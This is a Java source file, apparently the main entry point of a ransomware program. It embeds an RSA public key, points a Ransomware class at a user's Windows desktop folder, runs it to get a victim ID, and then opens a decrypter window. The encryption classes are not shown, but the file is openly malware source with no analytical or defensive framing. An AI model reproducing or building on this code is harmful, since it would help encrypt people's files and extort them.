package Ransomware;

public class Main {
    public static void main(String[] args) throws Exception{

        final String publicKey = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAMwoM84VLxeAXZqiFJr4EOi19otav+2r9fAH5aF6N/WUC9iOs3+HJIbMvzEy/X4ulVz3eVTy0j/fjl+yPFlHx60CAwEAAQ==";

        Ransomware ransomware = new Ransomware("C:/Users/Pruebasd/Desktop","TSUKUYOMI",publicKey);
        //Ransomware ransomware = new Ransomware("E:/Prueba","TSUKUYOMI",publicKey);

        String personalID = ransomware.execute();

        new UIDecrypter(personalID,"C:/Users/Pruebasd/Desktop");
    }
}
